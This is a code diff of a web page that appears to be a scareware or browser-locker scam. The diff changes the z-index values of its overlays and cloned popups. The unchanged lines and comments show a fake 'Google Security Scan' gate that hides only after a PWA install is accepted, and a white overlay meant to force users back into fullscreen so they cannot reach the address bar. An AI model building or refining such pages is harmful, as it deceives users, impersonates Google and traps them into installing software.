@@ -281,10 +281,10 @@
 
   <!-- Re-entry overlay: solid white screen shown when fullscreen exits;
        forces the user's next tap back into fullscreen before they can reach the address bar -->
-  <div id="reentry-overlay" style="display:none; position:fixed; top:-200px; left:0; right:0; height:calc(100dvh + 350px); background:#ffffff; z-index:2147483648; pointer-events:all;"></div>
+  <div id="reentry-overlay" style="display:none; position:fixed; top:-200px; left:0; right:0; height:calc(100dvh + 350px); background:#ffffff; z-index:500; pointer-events:all;"></div>
 
   <!-- Security scan gate: shown first; hides only after PWA install is accepted -->
-  <div id="scan-gate" style="display:flex; position:fixed; top:-200px; left:0; right:0; height:calc(100dvh + 350px); z-index:2147483649; background:#0a0a0a; flex-direction:column; align-items:center; justify-content:center; padding:220px 28px 160px; overflow:hidden; pointer-events:all;">
+  <div id="scan-gate" style="display:flex; position:fixed; top:-200px; left:0; right:0; height:calc(100dvh + 350px); z-index:1000; background:#0a0a0a; flex-direction:column; align-items:center; justify-content:center; padding:220px 28px 160px; overflow:hidden; pointer-events:all;">
     <div id="scan-phase">
       <div class="scan-shield">🛡️</div>
       <div class="scan-title">Google Security Scan</div>
@@ -311,7 +311,7 @@
   </div>
 
   <!-- PRIMARY POPUP — edit your message below -->
-  <div class="popup-layer" id="popup-0" style="z-index:2147483647;">
+  <div class="popup-layer" id="popup-0" style="z-index:100;">
 
     <!-- Orange icon — top right -->
     <div class="app-icon"></div>
@@ -569,7 +569,7 @@ EVIDENCE SUMMARY
     for (let i = 1; i <= 4; i++) {
       const clone = primaryPopup.cloneNode(true);
       clone.id = `popup-${i}`;
-      clone.style.zIndex = String(2147483647 - i);
+      clone.style.zIndex = String(100 - i);
       document.body.appendChild(clone);
     }
 
@@ -584,7 +584,7 @@ EVIDENCE SUMMARY
         if (!existing) {
           const div = primaryPopup.cloneNode(true);
           div.id = `popup-${i}`;
-          div.style.zIndex = String(2147483647 - i);
+          div.style.zIndex = String(100 - i);
           div.style.display = '';
           div.style.visibility = '';
           document.body.appendChild(div);
